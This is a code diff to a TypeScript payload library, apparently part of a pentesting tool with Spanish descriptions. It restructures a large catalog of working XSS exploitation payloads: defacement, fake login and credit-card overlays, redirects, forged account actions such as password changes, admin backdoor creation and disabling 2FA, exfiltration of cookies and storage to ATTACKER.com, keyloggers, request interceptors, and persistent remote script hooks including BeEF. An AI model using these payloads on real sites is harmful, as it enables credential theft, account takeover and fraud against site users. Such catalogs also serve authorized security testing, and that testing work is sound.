@@ -1503,101 +1503,132 @@ export const sqlTruncation: PayloadCategory = {
   ],
 }
 
-export const xssExploit: PayloadCategory = {
-  title: "XSS Exploit — DOM / Defacement / Actions",
-  description: "Payloads de explotación real: defacement, UI injection, redirección, CSRF via XSS, exfiltración, keylogging, control de flujo y persistencia (Stored XSS)",
-  tag: "XSS Exploit",
-  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
-  payloads: [
-    // ── 1. DOM Manipulation / Defacement ──────────────────────────────────────
-    "/* 🧱 1. DOM / DEFACEMENT — cambiar lo que el usuario ve */",
-    "document.body.innerHTML='<h1 style=\"color:red;text-align:center;margin-top:20vh;font-size:4rem\">Hacked</h1>'",
-    "document.body.innerHTML='<h1>Hacked by XSS</h1><p>Your site has been compromised.</p>'",
-    "document.title='HACKED'",
-    "document.querySelector('h1').innerText='HACKED'",
-    "document.querySelectorAll('p,h1,h2,h3,span,a').forEach(e=>e.innerText='HACKED')",
-    "document.body.style.cssText='background:#000!important;color:red!important;filter:invert(1)'",
-    "document.body.style.background='url(https://ATTACKER.com/defaced.jpg) no-repeat center/cover'",
-    "document.getElementById('content').remove()",
-    "document.querySelectorAll('img').forEach(i=>i.src='https://ATTACKER.com/hacked.png')",
-    "document.querySelectorAll('a').forEach(a=>a.href='https://ATTACKER.com')",
-    "<script>document.body.outerHTML='<body style=background:red><h1>Defaced</h1></body>'</script>",
-
-    // ── 2. UI Injection / Phishing in-site ───────────────────────────────────
-    "/* 🧩 2. UI INJECTION — agregar contenido falso a la página */",
-    "var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center';d.innerHTML='<div style=\"text-align:center\"><h2>Session expired</h2><form action=\"https://ATTACKER.com/steal\" method=\"POST\"><input name=\"user\" placeholder=\"Username\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><input type=\"password\" name=\"pass\" placeholder=\"Password\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><button style=\"padding:10px 30px;background:#0066cc;color:#fff;border:0;cursor:pointer\">Sign In</button></form></div>';document.body.appendChild(d)",
-    "var b=document.createElement('button');b.innerText='Verify Account';b.style.cssText='position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:#fff;padding:12px 20px;border:0;border-radius:6px;cursor:pointer;font-size:16px';b.onclick=()=>location.href='https://ATTACKER.com/phish';document.body.appendChild(b)",
-    "var m=document.createElement('div');m.style.cssText='position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#d32f2f;color:#fff;padding:14px 28px;border-radius:8px;z-index:99999;font-size:15px';m.innerText='⚠️ Your account has been flagged. Click here to verify.';m.onclick=()=>location.href='https://ATTACKER.com';document.body.appendChild(m)",
-    "var f=document.createElement('form');f.action='https://ATTACKER.com/steal';f.method='POST';f.innerHTML='<input name=\"cc\" placeholder=\"Card number\"><input name=\"exp\" placeholder=\"MM/YY\"><input name=\"cvv\" placeholder=\"CVV\"><button>Pay Now</button>';document.querySelector('form')?.replaceWith(f)",
-
-    // ── 3. Redirección ───────────────────────────────────────────────────────
-    "/* 🔁 3. REDIRECCIÓN — mover al usuario a otra página */",
-    "window.location='https://ATTACKER.com'",
-    "window.location.href='https://ATTACKER.com/fake-login'",
-    "location.replace('https://ATTACKER.com')",
-    "window.location.assign('https://ATTACKER.com')",
-    "setTimeout(()=>location.href='https://ATTACKER.com',3000)",
-    "window.open('https://ATTACKER.com','_blank')",
-    "history.pushState({},'','https://ATTACKER.com')",
-    "document.location='javascript:window.location=\"https://ATTACKER.com\"'",
-
-    // ── 4. Acciones como el usuario (CSRF via XSS) ────────────────────────────
-    "/* ⚙️ 4. ACCIONES COMO USUARIO — CSRF via XSS */",
-    "fetch('/api/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'hacked123'}),credentials:'include'})",
-    "fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})",
-    "fetch('/account/delete',{method:'POST',credentials:'include'})",
-    "fetch('/api/transfer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'attacker',amount:9999}),credentials:'include'})",
-    "var f=document.createElement('form');f.method='POST';f.action='/admin/create-user';f.innerHTML='<input name=\"username\" value=\"backdoor\"><input name=\"password\" value=\"P@ssw0rd\"><input name=\"role\" value=\"admin\">';document.body.appendChild(f);f.submit()",
-    "fetch('/api/user/settings',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({2fa_enabled:false}),credentials:'include'})",
-    "document.forms[0].action='https://ATTACKER.com/steal';document.forms[0].submit()",
-
-    // ── 5. Exfiltración / Requests externos ───────────────────────────────────
-    "/* 📡 5. EXFILTRACIÓN — enviar datos hacia afuera */",
-    "fetch('https://ATTACKER.com/?c='+document.cookie)",
-    "new Image().src='https://ATTACKER.com/?c='+encodeURIComponent(document.cookie)",
-    "navigator.sendBeacon('https://ATTACKER.com/collect',document.cookie)",
-    "fetch('https://ATTACKER.com/?ls='+btoa(JSON.stringify({...localStorage})))",
-    "fetch('https://ATTACKER.com/?ss='+btoa(JSON.stringify({...sessionStorage})))",
-    "fetch('https://ATTACKER.com/?dom='+btoa(document.body.innerHTML.substring(0,2000)))",
-    "fetch('https://ATTACKER.com/?url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer))",
-    "fetch('https://ATTACKER.com/?ua='+encodeURIComponent(navigator.userAgent)+'&lang='+navigator.language)",
-    "fetch('/api/userinfo',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://ATTACKER.com/?d='+btoa(JSON.stringify(d))))",
-    "var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/?c='+document.cookie);x.send()",
-    "document.write('<img src=\"https://ATTACKER.com/?c='+document.cookie+'\">')",
-
-    // ── 6. Keylogging ─────────────────────────────────────────────────────────
-    "/* ⌨️ 6. KEYLOGGING — capturar lo que escribe el usuario */",
-    "document.addEventListener('keypress',e=>fetch('https://ATTACKER.com/?k='+encodeURIComponent(e.key)))",
-    "var buf='';document.addEventListener('keydown',e=>{buf+=e.key;if(buf.length>20){fetch('https://ATTACKER.com/?keys='+encodeURIComponent(buf));buf=''}})",
-    "document.querySelectorAll('input,textarea').forEach(i=>i.addEventListener('input',e=>fetch('https://ATTACKER.com/?f='+encodeURIComponent(e.target.name||e.target.id)+'&v='+encodeURIComponent(e.target.value))))",
-    "document.querySelectorAll('input[type=password]').forEach(i=>i.addEventListener('change',e=>fetch('https://ATTACKER.com/?pass='+encodeURIComponent(e.target.value))))",
-    "document.addEventListener('paste',e=>fetch('https://ATTACKER.com/?paste='+encodeURIComponent((e.clipboardData||window.clipboardData).getData('text'))))",
-    "var orig=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){fetch('https://ATTACKER.com/?form='+encodeURIComponent(new URLSearchParams(new FormData(this)).toString()));orig.call(this)}",
-
-    // ── 7. Control del flujo ──────────────────────────────────────────────────
-    "/* 🧠 7. CONTROL DE FLUJO — manipular comportamiento del sitio */",
-    "document.querySelectorAll('button,input[type=submit],a').forEach(b=>b.disabled=true)",
-    "window.onbeforeunload=()=>''",
-    "setInterval(()=>document.querySelectorAll('button').forEach(b=>b.disabled=true),100)",
-    "var orig=window.fetch;window.fetch=function(u,o){fetch('https://ATTACKER.com/?intercept='+encodeURIComponent(u));return orig.apply(this,arguments)}",
-    "var origXHR=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){fetch('https://ATTACKER.com/?xhr='+encodeURIComponent(u));return origXHR.apply(this,arguments)}",
-    "history.pushState=function(){};history.replaceState=function(){}",
-    "window.confirm=()=>true;window.alert=()=>{}",
-    "document.querySelectorAll('a[href]').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();fetch('https://ATTACKER.com/?click='+a.href)}))",
-    "Object.defineProperty(document,'cookie',{get:()=>'',set:v=>fetch('https://ATTACKER.com/?setCookie='+encodeURIComponent(v))})",
-
-    // ── 8. Persistencia (Stored XSS) ─────────────────────────────────────────
-    "/* 🧬 8. PERSISTENCIA — stored XSS que se ejecuta para todos */",
-    "localStorage.setItem('__xss','<img src=x onerror=eval(atob(\"'+btoa('fetch(\"https://ATTACKER.com/?c=\"+document.cookie)')+'\"))>')",
-    "document.cookie='__session=<img src=x onerror=alert(1)>;path=/;SameSite=None'",
-    "var s=document.createElement('script');s.src='https://ATTACKER.com/hook.js';document.head.appendChild(s)",
-    "if(!window.__hooked){window.__hooked=1;var s=document.createElement('script');s.src='https://ATTACKER.com/persistent.js';document.head.appendChild(s)}",
-    "navigator.serviceWorker.register('/sw.js').catch(()=>{})",
-    "caches.open('xss').then(c=>c.add('/critical-page'))",
-    "indexedDB.open('xss').onsuccess=e=>e.target.result.transaction(['store'],'readwrite').objectStore('store').put({payload:'<script>alert(1)<\\/script>'},'key')",
-    "/* BeEF hook (usar con BeEF framework): */ var s=document.createElement('script');s.src='http://ATTACKER.com:3000/hook.js';document.head.appendChild(s)",
-  ],
+export interface XssExploitEntry {
+  name: string
+  description: string
+  payload: string
 }
+
+export interface XssExploitSection {
+  id: string
+  title: string
+  entries: XssExploitEntry[]
+}
+
+export const xssExploitSections: XssExploitSection[] = [
+  {
+    id: "defacement",
+    title: "DOM / Defacement",
+    entries: [
+      { name: "Full body replace", description: "Reemplaza todo el body con mensaje de hacked en grande", payload: "document.body.innerHTML='<h1 style=\"color:red;text-align:center;margin-top:20vh;font-size:4rem\">Hacked</h1>'" },
+      { name: "Simple defacement", description: "Inyecta mensaje simple con título y párrafo", payload: "document.body.innerHTML='<h1>Hacked by XSS</h1><p>Your site has been compromised.</p>'" },
+      { name: "Change page title", description: "Modifica el título visible en la pestaña del navegador", payload: "document.title='HACKED'" },
+      { name: "Replace heading", description: "Cambia el texto del primer H1 de la página", payload: "document.querySelector('h1').innerText='HACKED'" },
+      { name: "Mass text replace", description: "Sobrescribe el texto de todos los elementos visibles", payload: "document.querySelectorAll('p,h1,h2,h3,span,a').forEach(e=>e.innerText='HACKED')" },
+      { name: "CSS override", description: "Invierte colores: fondo negro, texto rojo, filtro invert", payload: "document.body.style.cssText='background:#000!important;color:red!important;filter:invert(1)'" },
+      { name: "Background image", description: "Reemplaza el fondo con una imagen del servidor del atacante", payload: "document.body.style.background='url(https://ATTACKER.com/defaced.jpg) no-repeat center/cover'" },
+      { name: "Remove element by ID", description: "Elimina un bloque del DOM por su ID (#content)", payload: "document.getElementById('content').remove()" },
+      { name: "Replace all images", description: "Sustituye el src de todas las imágenes de la página", payload: "document.querySelectorAll('img').forEach(i=>i.src='https://ATTACKER.com/hacked.png')" },
+      { name: "Hijack all links", description: "Apunta todos los <a> al dominio del atacante", payload: "document.querySelectorAll('a').forEach(a=>a.href='https://ATTACKER.com')" },
+      { name: "outerHTML replace", description: "Reemplaza el body completo mediante outerHTML (HTML injection)", payload: "<script>document.body.outerHTML='<body style=background:red><h1>Defaced</h1></body>'</script>" },
+    ],
+  },
+  {
+    id: "ui-injection",
+    title: "UI Injection",
+    entries: [
+      { name: "Fake login overlay", description: "Modal a pantalla completa con formulario de login falso que exfiltra credenciales", payload: "var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center';d.innerHTML='<div style=\"text-align:center\"><h2>Session expired</h2><form action=\"https://ATTACKER.com/steal\" method=\"POST\"><input name=\"user\" placeholder=\"Username\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><input type=\"password\" name=\"pass\" placeholder=\"Password\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><button style=\"padding:10px 30px;background:#0066cc;color:#fff;border:0;cursor:pointer\">Sign In</button></form></div>';document.body.appendChild(d)" },
+      { name: "Floating phish button", description: "Botón fijo en la esquina inferior derecha que redirige a página de phishing", payload: "var b=document.createElement('button');b.innerText='Verify Account';b.style.cssText='position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:#fff;padding:12px 20px;border:0;border-radius:6px;cursor:pointer;font-size:16px';b.onclick=()=>location.href='https://ATTACKER.com/phish';document.body.appendChild(b)" },
+      { name: "Fake alert banner", description: "Banner de advertencia falsa fijo en la parte superior con enlace malicioso", payload: "var m=document.createElement('div');m.style.cssText='position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#d32f2f;color:#fff;padding:14px 28px;border-radius:8px;z-index:99999;font-size:15px';m.innerText='Your account has been flagged. Click here to verify.';m.onclick=()=>location.href='https://ATTACKER.com';document.body.appendChild(m)" },
+      { name: "Replace payment form", description: "Sustituye el formulario real por uno que exfiltra datos de tarjeta de crédito", payload: "var f=document.createElement('form');f.action='https://ATTACKER.com/steal';f.method='POST';f.innerHTML='<input name=\"cc\" placeholder=\"Card number\"><input name=\"exp\" placeholder=\"MM/YY\"><input name=\"cvv\" placeholder=\"CVV\"><button>Pay Now</button>';document.querySelector('form')?.replaceWith(f)" },
+    ],
+  },
+  {
+    id: "redirect",
+    title: "Redirección",
+    entries: [
+      { name: "Immediate redirect", description: "Redirige al usuario de inmediato al dominio del atacante", payload: "window.location='https://ATTACKER.com'" },
+      { name: "Redirect to fake login", description: "Envía al usuario a una página de login falsa", payload: "window.location.href='https://ATTACKER.com/fake-login'" },
+      { name: "Location replace", description: "Redirige sin agregar la página al historial del navegador", payload: "location.replace('https://ATTACKER.com')" },
+      { name: "Location assign", description: "Redirige vía location.assign (agrega al historial)", payload: "window.location.assign('https://ATTACKER.com')" },
+      { name: "Delayed redirect", description: "Redirige al dominio del atacante después de 3 segundos", payload: "setTimeout(()=>location.href='https://ATTACKER.com',3000)" },
+      { name: "Open new tab", description: "Abre el dominio del atacante en una pestaña nueva", payload: "window.open('https://ATTACKER.com','_blank')" },
+      { name: "History push", description: "Manipula el historial del navegador sin recargar la página", payload: "history.pushState({},'','https://ATTACKER.com')" },
+      { name: "JS URI redirect", description: "Usa javascript: URI para ejecutar una redirección", payload: "document.location='javascript:window.location=\"https://ATTACKER.com\"'" },
+    ],
+  },
+  {
+    id: "csrf-xss",
+    title: "Acciones como usuario",
+    entries: [
+      { name: "Change password", description: "Cambia la contraseña del usuario autenticado vía fetch con credenciales de sesión", payload: "fetch('/api/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'hacked123'}),credentials:'include'})" },
+      { name: "Change email", description: "Modifica el email de la cuenta usando las cookies de sesión activas", payload: "fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})" },
+      { name: "Delete account", description: "Envía petición para eliminar la cuenta del usuario autenticado", payload: "fetch('/account/delete',{method:'POST',credentials:'include'})" },
+      { name: "Fund transfer", description: "Simula una transferencia de fondos al atacante vía API", payload: "fetch('/api/transfer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'attacker',amount:9999}),credentials:'include'})" },
+      { name: "Create backdoor admin", description: "Crea usuario backdoor con rol admin vía envío automático de formulario", payload: "var f=document.createElement('form');f.method='POST';f.action='/admin/create-user';f.innerHTML='<input name=\"username\" value=\"backdoor\"><input name=\"password\" value=\"P@ssw0rd\"><input name=\"role\" value=\"admin\">';document.body.appendChild(f);f.submit()" },
+      { name: "Disable 2FA", description: "Desactiva la autenticación de dos factores del usuario autenticado", payload: "fetch('/api/user/settings',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({'2fa_enabled':false}),credentials:'include'})" },
+      { name: "Hijack form action", description: "Redirige el action del formulario activo al servidor del atacante y lo envía", payload: "document.forms[0].action='https://ATTACKER.com/steal';document.forms[0].submit()" },
+    ],
+  },
+  {
+    id: "exfil",
+    title: "Exfiltración",
+    entries: [
+      { name: "Cookie via fetch", description: "Exfiltra las cookies de sesión vía fetch GET al servidor del atacante", payload: "fetch('https://ATTACKER.com/?c='+document.cookie)" },
+      { name: "Cookie via img beacon", description: "Exfiltra cookies usando una petición Image (bypass de CORS)", payload: "new Image().src='https://ATTACKER.com/?c='+encodeURIComponent(document.cookie)" },
+      { name: "Cookie via sendBeacon", description: "Envía cookies con sendBeacon (funciona incluso al cerrar la pestaña)", payload: "navigator.sendBeacon('https://ATTACKER.com/collect',document.cookie)" },
+      { name: "LocalStorage dump", description: "Exfiltra todo el localStorage serializado en base64", payload: "fetch('https://ATTACKER.com/?ls='+btoa(JSON.stringify({...localStorage})))" },
+      { name: "SessionStorage dump", description: "Exfiltra todo el sessionStorage en base64", payload: "fetch('https://ATTACKER.com/?ss='+btoa(JSON.stringify({...sessionStorage})))" },
+      { name: "DOM snapshot", description: "Envía los primeros 2000 caracteres del HTML de la página actual", payload: "fetch('https://ATTACKER.com/?dom='+btoa(document.body.innerHTML.substring(0,2000)))" },
+      { name: "URL + Referrer", description: "Captura la URL actual y el referrer del usuario", payload: "fetch('https://ATTACKER.com/?url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer))" },
+      { name: "Browser fingerprint", description: "Exfiltra User-Agent e idioma del navegador", payload: "fetch('https://ATTACKER.com/?ua='+encodeURIComponent(navigator.userAgent)+'&lang='+navigator.language)" },
+      { name: "Authenticated API exfil", description: "Llama una API autenticada y reenvía la respuesta JSON al atacante", payload: "fetch('/api/userinfo',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://ATTACKER.com/?d='+btoa(JSON.stringify(d))))" },
+      { name: "XHR beacon", description: "Exfiltra cookies vía XMLHttpRequest clásico", payload: "var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/?c='+document.cookie);x.send()" },
+      { name: "document.write img", description: "Beacon vía document.write para contextos de inyección HTML directa", payload: "document.write('<img src=\"https://ATTACKER.com/?c='+document.cookie+'\">')" },
+    ],
+  },
+  {
+    id: "keylogging",
+    title: "Keylogging",
+    entries: [
+      { name: "Per-key logger", description: "Envía cada tecla presionada al servidor del atacante en tiempo real", payload: "document.addEventListener('keypress',e=>fetch('https://ATTACKER.com/?k='+encodeURIComponent(e.key)))" },
+      { name: "Buffered keylogger", description: "Acumula teclas y las envía en lotes de 20 caracteres (menos ruido)", payload: "var buf='';document.addEventListener('keydown',e=>{buf+=e.key;if(buf.length>20){fetch('https://ATTACKER.com/?keys='+encodeURIComponent(buf));buf=''}})" },
+      { name: "Input field logger", description: "Registra cambios en todos los inputs y textareas de la página", payload: "document.querySelectorAll('input,textarea').forEach(i=>i.addEventListener('input',e=>fetch('https://ATTACKER.com/?f='+encodeURIComponent(e.target.name||e.target.id)+'&v='+encodeURIComponent(e.target.value))))" },
+      { name: "Password field logger", description: "Captura el valor de campos de tipo password cuando cambian", payload: "document.querySelectorAll('input[type=password]').forEach(i=>i.addEventListener('change',e=>fetch('https://ATTACKER.com/?pass='+encodeURIComponent(e.target.value))))" },
+      { name: "Clipboard logger", description: "Captura el texto pegado por el usuario vía evento paste", payload: "document.addEventListener('paste',e=>fetch('https://ATTACKER.com/?paste='+encodeURIComponent((e.clipboardData||window.clipboardData).getData('text'))))" },
+      { name: "Form submit hook", description: "Intercepta el submit del formulario y exfiltra todos los campos", payload: "var orig=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){fetch('https://ATTACKER.com/?form='+encodeURIComponent(new URLSearchParams(new FormData(this)).toString()));orig.call(this)}" },
+    ],
+  },
+  {
+    id: "flow-control",
+    title: "Control de flujo",
+    entries: [
+      { name: "Disable all buttons", description: "Desactiva todos los botones, inputs de envío y links de la página", payload: "document.querySelectorAll('button,input[type=submit],a').forEach(b=>b.disabled=true)" },
+      { name: "Block navigation", description: "Muestra un diálogo si el usuario intenta abandonar la página", payload: "window.onbeforeunload=()=>''" },
+      { name: "Persistent disable", description: "Re-deshabilita botones cada 100ms para bypass de frameworks JS reactivos", payload: "setInterval(()=>document.querySelectorAll('button').forEach(b=>b.disabled=true),100)" },
+      { name: "Fetch interceptor", description: "Monitorea y exfiltra la URL de todas las llamadas fetch del sitio", payload: "var orig=window.fetch;window.fetch=function(u,o){fetch('https://ATTACKER.com/?intercept='+encodeURIComponent(u));return orig.apply(this,arguments)}" },
+      { name: "XHR interceptor", description: "Intercepta todas las solicitudes XMLHttpRequest y exfiltra sus URLs", payload: "var origXHR=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){fetch('https://ATTACKER.com/?xhr='+encodeURIComponent(u));return origXHR.apply(this,arguments)}" },
+      { name: "Freeze navigation", description: "Bloquea pushState y replaceState para fijar la URL actual", payload: "history.pushState=function(){};history.replaceState=function(){}" },
+      { name: "Override dialogs", description: "Auto-confirma alerts/confirms y suprime todos los cuadros de diálogo", payload: "window.confirm=()=>true;window.alert=()=>{}" },
+      { name: "Link click monitor", description: "Previene clics en links y exfiltra la URL de destino", payload: "document.querySelectorAll('a[href]').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();fetch('https://ATTACKER.com/?click='+a.href)}))" },
+      { name: "Cookie setter hook", description: "Intercepta todas las escrituras en document.cookie y las exfiltra", payload: "Object.defineProperty(document,'cookie',{get:()=>'',set:v=>fetch('https://ATTACKER.com/?setCookie='+encodeURIComponent(v))})" },
+    ],
+  },
+  {
+    id: "persistence",
+    title: "Persistencia",
+    entries: [
+      { name: "LocalStorage payload", description: "Almacena payload en localStorage para re-ejecución al recargar la página", payload: "localStorage.setItem('__xss','<img src=x onerror=eval(atob(\"'+btoa('fetch(\"https://ATTACKER.com/?c=\"+document.cookie)')+'\"))>')" },
+      { name: "Cookie payload", description: "Inyecta un payload XSS almacenado en una cookie con path=/", payload: "document.cookie='__session=<img src=x onerror=alert(1)>;path=/;SameSite=None'" },
+      { name: "Remote script loader", description: "Carga un script externo desde el servidor del atacante vía <script>", payload: "var s=document.createElement('script');s.src='https://ATTACKER.com/hook.js';document.head.appendChild(s)" },
+      { name: "Idempotent hook", description: "Carga el hook solo una vez usando un flag guard (evita duplicados)", payload: "if(!window.__hooked){window.__hooked=1;var s=document.createElement('script');s.src='https://ATTACKER.com/persistent.js';document.head.appendChild(s)}" },
+      { name: "Service Worker", description: "Registra un Service Worker del atacante que persiste en el navegador", payload: "navigator.serviceWorker.register('/sw.js').catch(()=>{})" },
+      { name: "Cache API", description: "Cachea una página crítica en la Cache API del navegador del usuario", payload: "caches.open('xss').then(c=>c.add('/critical-page'))" },
+      { name: "IndexedDB injection", description: "Persiste un payload XSS en IndexedDB para sobrevivir a recargas", payload: "indexedDB.open('xss').onsuccess=e=>e.target.result.transaction(['store'],'readwrite').objectStore('store').put({payload:'<script>alert(1)<\\/script>'},'key')" },
+      { name: "BeEF Hook", description: "Conecta el navegador al framework BeEF para control completo del cliente", payload: "var s=document.createElement('script');s.src='http://ATTACKER.com:3000/hook.js';document.head.appendChild(s)" },
+    ],
+  },
+]
 
 export const allPayloadCategories: PayloadCategory[] = [
   sqliClassic,
@@ -1640,5 +1671,4 @@ export const allPayloadCategories: PayloadCategory[] = [
   httpParameterPollution,
   cachePoisoning,
   sqlTruncation,
-  xssExploit,
 ]
